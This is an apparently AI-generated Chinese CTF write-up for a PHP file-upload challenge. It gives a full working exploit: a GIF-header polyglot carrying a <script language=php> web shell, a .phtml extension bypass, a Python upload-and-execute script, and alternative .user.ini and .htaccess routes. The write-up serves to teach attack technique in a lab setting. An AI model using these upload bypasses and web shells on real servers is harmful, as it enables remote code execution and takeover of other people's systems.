---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'a5578d09-3f1d-45bd-81cd-9a909ff65cff'
  PropagateID: 'a5578d09-3f1d-45bd-81cd-9a909ff65cff'
  ReservedCode1: '94f5f2df-dd3a-4e90-9400-2d0797b8f1bc'
  ReservedCode2: '94f5f2df-dd3a-4e90-9400-2d0797b8f1bc'
---

## Syclover 极客大挑战 文件上传 — GIF头+script标签+后缀绕过

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - 文件上传漏洞 |
| 难度 | 中等 |
| 日期 | 2026-08-11 |
| 来源 | DASCTF（Syclover 极客大挑战） |
| Flag | `CTF2{afff02d6-2999-425c-9b03-facf2ce92ad8}` |

### 题目描述

PHP 5.5.9 + OpenResty（nginx）应用，头像上传功能 `upload_file.php`，上传目录 `/upload/` 有目录列表。服务器对上传文件进行两层检查：文件内容是否为图片 + 文件内容是否包含 PHP 代码标签。

### 信息收集

#### 页面结构

```
index.php → 上传表单 (POST /upload_file.php, multipart/form-data)
upload_file.php → 处理上传，返回结果消息
/upload/ → Apache 目录列表（已上传文件可浏览）
```

#### 服务器环境

```
Server: openresty (nginx)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
.htaccess 存在但无效（nginx 不读取 .htaccess）
```

### 上传过滤规则

| 检查项 | 规则 | 绕过方式 |
|--------|------|----------|
| 文件内容图片检测 | `getimagesize()` 或类似函数检查文件头 | 在文件开头添加有效的 GIF/PNG/JPEG 头 |
| PHP 代码标签检测 | 检查 `<?php`、`<?`、`<?=` 标签 | 使用 `<script language="php">...</script>` 替代 |
| 后缀过滤 | 拦截 `.php` 后缀 | 使用 `.phtml` 后缀（nginx+PHP-FPM 配置了 .phtml 解析） |

#### 过滤检测结果

```
上传 test.txt → "Not image!"          （非图片内容）
上传 test.php (GIF头+<?php) → "NO! HACKER! your file included '<?'"  （检测到PHP标签）
上传 test.php (GIF头+<script) → "NOT！php!"  （.php后缀被拦截）
上传 test.gif (GIF头+<script language=php>) → 成功上传！
上传 test.phtml (GIF头+<script language=php>) → 成功上传！且被PHP解析执行！
```

### 绕过技术详解

#### 1. GIF 文件头绕过图片检测

```python
# 最小有效 GIF 文件头
minimal_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00' \
              b'\xff\xff\xff\x00\x00\x00\x2c\x00\x00' \
              b'\x00\x00\x01\x00\x01\x00\x00\x02\x02' \
              b'\x44\x01\x00\x3b'
```

- `GIF89a` — GIF 文件标识
- 后续字节定义一个 1x1 像素的 GIF 图像
- `getimagesize()` 会识别此为有效 GIF

#### 2. `<script language="php">` 绕过 PHP 标签检测

```php
// 被拦截的写法：
<?php system("cat /flag"); ?>    ← 检测到 <?
<? system("cat /flag"); ?>       ← 检测到 <?
<?= system("cat /flag"); ?>      ← 检测到 <?=

// 通过的写法：
<script language=php>system("cat /flag");</script>  ← 不包含 <?
```

- PHP 支持三种标签：`<?php ?>`、`<? ?>`、`<script language="php"></script>`
- 服务器只检测 `<?` 开头的标签，未检测 `<script language="php">`
- 这是 PHP 的长标签语法（ASP 风格标签 `<% %>` 也是替代方式，但需 `asp_tags=On`）

#### 3. `.phtml` 后缀绕过

```
.php    → BLOCKED（后缀黑名单拦截）
.phtml  → PASS（未被列入黑名单，且被 nginx+PHP-FPM 配置为 PHP 解析）
.php5   → PASS（上传成功但可能不被解析）
.php7   → PASS（同上）
.pht    → PASS（同上）
.inc    → PASS（同上）
```

### 完整利用流程

#### Step 1: 构造载荷

```python
minimal_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00' \
              b'\xff\xff\xff\x00\x00\x00\x2c\x00\x00' \
              b'\x00\x00\x01\x00\x01\x00\x00\x02\x02' \
              b'\x44\x01\x00\x3b'

payload = minimal_gif + b'<script language=php>system("cat /flag");</script>'
```

#### Step 2: 上传

```python
import requests

session = requests.Session()
files = {'file': ('flagread.phtml', payload, 'image/gif')}
r = session.post('http://TARGET/upload_file.php', files=files)
# 响应: "上传文件名: flagread.phtml" → 成功
```

#### Step 3: 访问执行

```python
r = session.get('http://TARGET/upload/flagread.phtml')
# 响应包含: GIF89a[二进制]CTF2{afff02d6-2999-425c-9b03-facf2ce92ad8}
```

### 解题脚本

```python
import requests

TARGET = 'http://TARGET/http-ctf2.dasctf.com'
session = requests.Session()

# 1. 构造载荷: 有效GIF头 + <script language=php> 执行命令
minimal_gif = (
    b'GIF89a\x01\x00\x01\x00\x80\x00\x00'
    b'\xff\xff\xff\x00\x00\x00\x2c\x00\x00'
    b'\x00\x00\x01\x00\x01\x00\x00\x02\x02'
    b'\x44\x01\x00\x3b'
)

payload = minimal_gif + b'<script language=php>system("cat /flag");</script>'

# 2. 上传 .phtml 文件
files = {'file': ('getflag.phtml', payload, 'image/gif')}
r = session.post(f'{TARGET}/upload_file.php', files=files)
print(f"Upload response: {r.text[:200]}")

# 3. 访问执行
import time
time.sleep(1)
r = session.get(f'{TARGET}/upload/getflag.phtml')
flag = ''.join(c for c in r.text if c.isprintable() or c in '\n\t ')
# 去掉 GIF 头部二进制内容
if 'CTF2{' in flag:
    start = flag.index('CTF2{')
    end = flag.index('}', start) + 1
    print(f"FLAG: {flag[start:end]}")
```

### 其他绕过方案

#### 方案二：.user.ini + auto_prepend_file

```
1. 上传 .user.ini（加GIF头）: auto_prepend_file=shell.gif
2. 上传 shell.gif（加GIF头）: <script language=php>system("cat /flag");</script>
3. 访问 /upload/ 下任意 PHP 文件触发 prepend

注意：
- .user.ini 有缓存周期（user_ini.cache_ttl，默认300秒）
- 需要目录中有 PHP 文件被访问才能触发
- 本题因 nginx 未配置 .php 后缀解析，需要 .phtml 文件来触发
```

#### 方案三：.htaccess（Apache 环境）

```
本题不适用（Server 为 OpenResty/nginx，不读取 .htaccess）
但在 Apache 环境下：
1. 上传 .htaccess: AddType application/x-httpd-php .gif
2. 上传 shell.gif: <script language=php>system("cat /flag");</script>
3. 访问 shell.gif 即被执行为 PHP
```

### 核心知识点

| 知识点 | 说明 |
|--------|------|
| GIF 文件头绕过 `getimagesize()` | 在载荷前添加有效的 GIF/PNG/JPEG 二进制头部 |
| `<script language="php">` 绕过 `<?` 检测 | PHP 支持的长标签语法，不包含 `<?` 字符 |
| `.phtml` 后缀绕过 `.php` 黑名单 | nginx+PHP-FPM 常配置 .phtml 为 PHP 解析后缀 |
| `.user.ini` + `auto_prepend_file` | PHP-FPM 模式下的文件包含技巧，每个请求自动 prepend 指定文件 |
| OpenResty/nginx 不读 `.htaccess` | 判断服务器类型选择绕过策略，Apache 用 .htaccess，nginx 用 .user.ini |
| 目录列表信息泄露 | `/upload/` 开启了目录列表，可以查看其他选手的上传尝试 |

### 同类变体与扩展

- 若 `<script language=php>` 被拦截，可尝试 ASP 风格标签 `<% %>`（需 `asp_tags=On`）
- 若 `.phtml` 被拦截，尝试 `.php3/.php5/.php7/.pht/.inc/.phps` 等替代后缀
- 若 GIF 头被二次检查（二次渲染），使用图片马 + 文件包含的组合
- 若目录无 PHP 文件触发 `.user.ini`，可尝试上传 `.phtml` 触发
- 图片二次渲染绕过：用工具在渲染后的图片中注入代码（保持文件结构有效）
- 条件竞争上传：上传临时文件 + 快速访问，绕过重命名/删除检查

> AI生成